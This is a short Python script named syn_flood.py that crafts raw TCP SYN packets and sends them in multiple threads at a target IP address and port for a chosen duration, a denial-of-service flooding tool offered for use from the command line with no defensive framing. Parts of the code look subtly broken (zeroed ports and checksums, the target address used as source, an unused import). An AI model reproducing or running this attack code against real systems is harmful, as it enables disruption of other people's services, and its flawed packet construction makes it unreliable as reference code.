# syn_flood.py
import socket
import random
import threading
import time
import sys

def syn_flood(target_ip, port, duration):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    ip_header = b'\x45\x00\x00\x28'  # Version, IHL, Type of Service, Total Length
    ip_header += b'\xab\xcd\x00\x00'  # Identification, Flags, Fragment Offset
    ip_header += b'\x40\x06\x00\x00'  # Time to Live, Protocol, Header Checksum
    ip_header += socket.inet_aton(target_ip)  # Source IP
    ip_header += socket.inet_aton(target_ip)  # Destination IP

    tcp_header = b'\x00\x00'  # Source Port
    tcp_header += b'\x00\x00'  # Destination Port
    tcp_header += b'\x00\x00\x00\x00'  # Sequence Number
    tcp_header += b'\x00\x00\x00\x00'  # Acknowledgment Number
    tcp_header += b'\x50\x02'  # Offset, Reserved, Flags
    tcp_header += b'\x00\x00'  # Window Size
    tcp_header += b'\x00\x00'  # Checksum
    tcp_header += b'\x00\x00'  # Urgent Pointer

    packet = ip_header + tcp_header

    end_time = time.time() + duration
    while time.time() < end_time:
        s.sendto(packet, (target_ip, port))
        time.sleep(0.001)

def main():
    if len(sys.argv) != 5:
        print("Usage: python syn_flood.py <target_ip> <port> <duration> <threads>")
        return

    target_ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    threads = int(sys.argv[4])

    for _ in range(threads):
        threading.Thread(target=syn_flood, args=(target_ip, port, duration)).start()

if __name__ == "__main__":
    main()
